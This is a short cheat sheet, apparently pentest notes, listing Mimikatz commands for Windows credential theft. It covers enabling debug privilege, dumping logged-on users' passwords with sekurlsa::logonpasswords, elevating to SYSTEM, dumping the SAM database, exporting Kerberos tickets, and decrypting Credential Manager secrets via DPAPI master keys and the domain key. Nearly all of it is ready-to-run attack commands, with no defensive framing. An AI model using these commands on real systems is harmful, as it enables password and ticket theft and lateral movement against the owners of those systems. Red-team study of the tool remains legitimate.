# Mimikatz
> A little tool to play with Windows security  
[GitHub - gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)

- - - -
## Passwords & SAM
Launch mimikatz (as Administrator!)
`mimikatz.exe`

Engage SeDebugPrivilege
`privilege::debug`
-> OK

Whoami
`token::whoami`

Dump creds of all logged-on users
`sekurlsa::logonpasswords`

(Optional) Impersonate to nt authority\system
`token::elevate` 

Dump sam database
`lsadump::sam`

- - - -
## Tickets
Show tickets
`sekurlsa::tickets`

Export tickets
`kerberos::list /export`

- - - -
## Credential manager saved credentials
[howto ~ credential manager saved credentials · gentilkiwi/mimikatz Wiki · GitHub](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)

locally?
`vault::cred`

From DC?
`dpapi::cred /in:"C:\Users\Bethany\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D"`
```
[...]
  guidMasterKey      : {fbd1319f-d18d-448f-92e2-287944ecf24c}
[...]
```

`dpapi::masterkey /in:"C:\Users\Bethany\AppData\Roaming\Microsoft\Protect\S-1-5-21-471342483-1622715373-4132421626-1002\fbd1319f-d18d-448f-92e2-287944ecf24c"`

-> look for "[domainkey]", decrypt using same command with `/rpc`

- - - -